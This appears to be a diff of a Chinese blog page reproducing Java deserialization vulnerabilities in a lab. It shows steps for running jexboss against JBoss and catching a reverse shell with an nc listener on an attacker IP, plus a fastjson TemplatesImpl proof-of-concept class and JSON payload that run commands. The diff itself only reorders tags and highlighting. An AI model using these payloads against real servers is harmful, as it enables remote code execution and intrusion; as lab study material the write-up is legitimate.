@@ -12,7 +12,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
   
-    <meta name="keywords" content="漏洞复现,java,反序列化,">
+    <meta name="keywords" content="java,漏洞复现,反序列化,">
   
 
 
@@ -210,7 +210,7 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/joaomatosf/jexboss.git</span><br><span class="line">cd jexboss</span><br><span class="line">python jexboss.py -host http://192.168.31.7:8080</span><br></pre></td></tr></table></figure>
 <p><img src="/2019/09/16/Java反序列化检测及漏洞复现/1567416611533.png" alt="1567416611533"></p>
 <p>接着输入</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">No</span><br><span class="line">yes</span><br><span class="line">192.168.31.116 #攻击机ip</span><br><span class="line">9999 #攻击机监听端口</span><br><span class="line"><span class="meta">#</span>打开新的窗口 设置监听</span><br><span class="line">nc -l -p 9999 -vv</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">No</span><br><span class="line">yes</span><br><span class="line">192.168.31.116 #攻击机ip</span><br><span class="line">9999 #攻击机监听端口</span><br><span class="line"><span class="meta">#</span><span class="bash">打开新的窗口 设置监听</span></span><br><span class="line">nc -l -p 9999 -vv</span><br></pre></td></tr></table></figure>
 <p>按下回车后再在nc监听窗口按一下回车获得反弹的shell，这种方式获得的shell一般权限都比较高。</p>
 <p><img src="/2019/09/16/Java反序列化检测及漏洞复现/qqq.png" alt="1567416447170"></p>
 <h3 id="fastjson-反序列化导致任意命令执行漏洞"><a href="#fastjson-反序列化导致任意命令执行漏洞" class="headerlink" title="fastjson 反序列化导致任意命令执行漏洞"></a>fastjson 反序列化导致任意命令执行漏洞</h3><blockquote>
@@ -249,7 +249,7 @@
 <p>这里设置执行的命令是在home下创建hacker文件，实际中可以执行任意命令</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Poc</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"touch /home/hacker"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] haFndlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Poc t = <span class="keyword">new</span> Poc();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>然后回到主目录编译代码,这里首先要安装maven，比较简单，这里不再赘述。</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd ../../../</span><br><span class="line">mvn compile			#编译</span><br><span class="line"><span class="meta">#</span>这时候在target/classes文件下会生成Poc.class文件，下面对其进行base64编码</span><br><span class="line">base64 Poc.class</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd ../../../</span><br><span class="line">mvn compile			#编译</span><br><span class="line"><span class="meta">#</span><span class="bash">这时候在target/classes文件下会生成Poc.class文件，下面对其进行base64编码</span></span><br><span class="line">base64 Poc.class</span><br></pre></td></tr></table></figure>
 <p>生成后放到如下位置中</p>
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>,<span class="attr">"_bytecodes"</span>:[<span class="string">"放到这里"</span>],<span class="attr">"_name"</span>:<span class="string">"a.b"</span>,<span class="attr">"_tfactory"</span>:&#123; &#125;,<span class="attr">"_outputProperties"</span>:&#123; &#125;,<span class="attr">"_version"</span>:<span class="string">"1.0"</span>,<span class="attr">"allowedProtocols"</span>:<span class="string">"all"</span>&#125;</span><br></pre></td></tr></table></figure>
 <h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>正常访问Hello World  抓包，构造一个POST数据提交，目标会提取json对象中的name和age拼接成一句话返回。</p>
@@ -296,14 +296,14 @@
           <i class="iconfont icon-06tags"></i>标签: 
           
           <span class="span--tag">
-            <a href="/tags/漏洞复现/">
-              #漏洞复现
+            <a href="/tags/java/">
+              #java
             </a>
           </span>
           
           <span class="span--tag">
-            <a href="/tags/java/">
-              #java
+            <a href="/tags/漏洞复现/">
+              #漏洞复现
             </a>
           </span>
           
